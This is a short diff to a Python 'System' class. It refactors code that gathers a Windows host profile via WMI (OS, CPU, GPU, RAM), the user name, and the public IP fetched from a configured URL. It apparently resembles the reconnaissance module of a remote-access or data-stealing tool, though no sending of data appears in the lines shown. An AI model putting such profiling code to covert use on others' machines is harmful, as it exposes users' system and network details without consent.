@@ -31,18 +31,22 @@ class System:
 
         if self.statuses[1] is True:
 
-            win_object = GetObject("winmgmts:root\\cimv2")
+            win = GetObject("winmgmts:root\\cimv2")
 
-            os_info = win_object.ExecQuery("Select * from Win32_OperatingSystem")[0]
-            net_info = poolmanager.PoolManager().request(method="GET", url=self.config.IPUrl).data.decode("utf-8")
-            cpu_info = win_object.ExecQuery("Select * from Win32_Processor")[0].Name
-            gpu_info = win_object.ExecQuery("Select * from Win32_VideoController")[0].Name
+            os_info = win.ExecQuery("Select * from Win32_OperatingSystem")[0]
+            cpu_info = win.ExecQuery("Select * from Win32_Processor")[0].Name
+            gpu_info = win.ExecQuery("Select * from Win32_VideoController")[0].Name
+
+            try:
+                net_info = poolmanager.PoolManager().request("GET", self.config.IPUrl, timeout=5.0).data.decode("utf-8")
+            except:
+                net_info = "Error"
 
             info = (
                 f"User: {self.config.User}\n",
                 f"IP: {net_info}\n",
                 f"OS Name: {os_info.Name.split('|')[0]}\n",
-                f"OS Version: {' '.join([os_info.Version, os_info.BuildNumber])}\n",
+                f"OS Version: {os_info.Version} {os_info.BuildNumber}\n",
                 f"CPU: {cpu_info}\n",
                 f"GPU: {gpu_info}\n",
                 f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n"
